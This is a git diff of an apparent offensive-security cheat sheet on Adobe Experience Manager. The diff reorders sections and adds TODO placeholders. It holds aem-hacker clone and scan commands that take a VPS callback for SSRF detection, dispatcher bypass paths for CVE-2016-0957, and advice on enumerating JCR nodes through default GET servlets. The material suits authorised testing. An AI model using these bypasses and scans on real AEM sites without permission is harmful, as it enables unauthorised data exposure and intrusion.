@@ -35,12 +35,12 @@ This is due to an impropper configuration of the **Dispatcher**, wich is a very 
 
 ### Apache Sling & Apache JackRabbit
 
-
+> TODO
 
 #### JCR Nodes
 
 
-
+> TODO
 
 
 ### AEM Dispatcher
@@ -54,74 +54,26 @@ With this in mind, the idea is clear, try to find super juicy hidden gems behind
 
 
 
-## Tooling
-
-### aem-hacker
-
-Great tool by Mikhail Egorov ([@0ang3el](https://twitter.com/0ang3el)) you can find in his repository at [github.com/0ang3el/aem-hacker](https://github.com/0ang3el/aem-hacker). If the target has some kind of Waf or the typicall CDN abuse protection (Cloudflare, Akamai...), a fork of the tool that adds delay between requests as a parameter can be found at [github.com/luastan/aem-hacker](https://github.com/luastan/aem-hacker). Clone it here:
-
- - **Original** version: `git clone https://github.com/0ang3el/aem-hacker.git`
- - **Delayed** version: `git clone https://github.com/luastan/aem-hacker.git`
-
-
-Usage is simple, but you will need a VPS or port forwarding of some kind for it to detect SSRFs:
-
-```shell
-python3 aem_hacker.py -u "{{ target-url https://aem.webapp }}" --host "{{ vps-ip 127.0.0.1 }}" --port "{{ vps-port 30001 }}"
-```
-
-
-If you want to use the **delay between requests** version, the command would be the following:
-
-```shell
-python3 aem_hacker.py -u "{{ target-url https://aem.webapp }}" --delay "{{ request-delay 2 }}" --workers "{{ workers 1 }}" --host "{{ vps-ip 127.0.0.1 }}" --port "{{ vps-port 30001 }}"
-```
-
-Take in mind that the delayed version is just a quick solution, it only delays requests within the same worker, which means that if you have 3 workers running and a delay of 2, you will end up sending 3 requests every 2 seconds.
-
-
 ## Fingerprinting
 
-
-
-## Discovery
-
-
-
+> TODO
 
 ## Exploitation
 
 
-### Dispatcher bypasses
-
-This bypasses will help you abuse the other exploitaition techniques exposed here so keep them in mind.
-
-#### Appending stuff (CVE-2016-0957)
-
-Here 
-
-```txt[common_bypasses.txt]
-/a.css
-/a.html
-/a.ico
-/%0aa.css
-/a.1.json
-```
-
-#### Using multiple slashes
-Using multiple slashes can get you some bypasses. For example:
- - `///etc.json` instead of `/etc.json`
- - `///bin///querybuilder.json` instead of `///bin///querybuilder.json`
-
 
 ### Default GET Servlets
+
+
 Huge profit right here; you can stop the `gobuster` you have running in the background already, as this is even going to list even that juicy `/bin/S3cr3t/RANDOM_STR/NO_WAY_THIS_IS_IN_A_WORDLIST` path. This is a feature in Apache Sling you can find more info about in:
  - [Rendering Content - Default GET Servlets](https://sling.apache.org/documentation/bundles/rendering-content-default-get-servlets.html)
 
 
 So, the idea behind this is that you can retrieve JCR nodes with its props (size, authors/usernames, dates, filenames, child node names...). This can work on any path for the AEM site and you can build _queries_ against them like this:
 
-![How to get JCR nodes](/aem_defaultgetservlet_selection_guide.png)
+
+<content-aem-selector-guide></content-aem-selector-guide>
+
 
 
 To _build_ such URLs you can use the following params:
@@ -157,6 +109,29 @@ for path in ['{0}{1}{2}'.format(p1, p2, p3.format('{0}')) for p1, p2, p3 in GETS
 ```
 
 You can execute the script from above as a _"one-liner"_ directly pasting it in `python -c ""` (Nasty but works).
+
+
+### Dispatcher bypasses
+
+This bypasses will help you abuse the other exploitaition techniques exposed here so keep them in mind.
+
+#### Appending stuff (CVE-2016-0957)
+
+Here 
+
+```txt[common_bypasses.txt]
+/a.css
+/a.html
+/a.ico
+/%0aa.css
+/a.1.json
+```
+
+#### Using multiple slashes
+Using multiple slashes can get you some bypasses. For example:
+ - `///etc.json` instead of `/etc.json`
+ - `///bin///querybuilder.json` instead of `///bin///querybuilder.json`
+
 
 
 
@@ -197,6 +172,33 @@ It is very useful. Allows you to search and even get node contents. Take
 ### SSRF to RCE
 
 > TODO
+
+
+
+## Tooling
+
+### aem-hacker
+
+Great tool by Mikhail Egorov ([@0ang3el](https://twitter.com/0ang3el)) you can find in his repository at [github.com/0ang3el/aem-hacker](https://github.com/0ang3el/aem-hacker). If the target has some kind of Waf or the typicall CDN abuse protection (Cloudflare, Akamai...), a fork of the tool that adds delay between requests as a parameter can be found at [github.com/luastan/aem-hacker](https://github.com/luastan/aem-hacker). Clone it here:
+
+ - **Original** version: `git clone https://github.com/0ang3el/aem-hacker.git`
+ - **Delayed** version: `git clone https://github.com/luastan/aem-hacker.git`
+
+
+Usage is simple, but you will need a VPS or port forwarding of some kind for it to detect SSRFs:
+
+```shell
+python3 aem_hacker.py -u "{{ target-url https://aem.webapp }}" --host "{{ vps-ip 127.0.0.1 }}" --port "{{ vps-port 30001 }}"
+```
+
+
+If you want to use the **delay between requests** version, the command would be the following:
+
+```shell
+python3 aem_hacker.py -u "{{ target-url https://aem.webapp }}" --delay "{{ request-delay 2 }}" --workers "{{ workers 1 }}" --host "{{ vps-ip 127.0.0.1 }}" --port "{{ vps-port 30001 }}"
+```
+
+Take in mind that the delayed version is just a quick solution, it only delays requests within the same worker, which means that if you have 3 workers running and a delay of 2, you will end up sending 3 requests every 2 seconds.
 
 
 
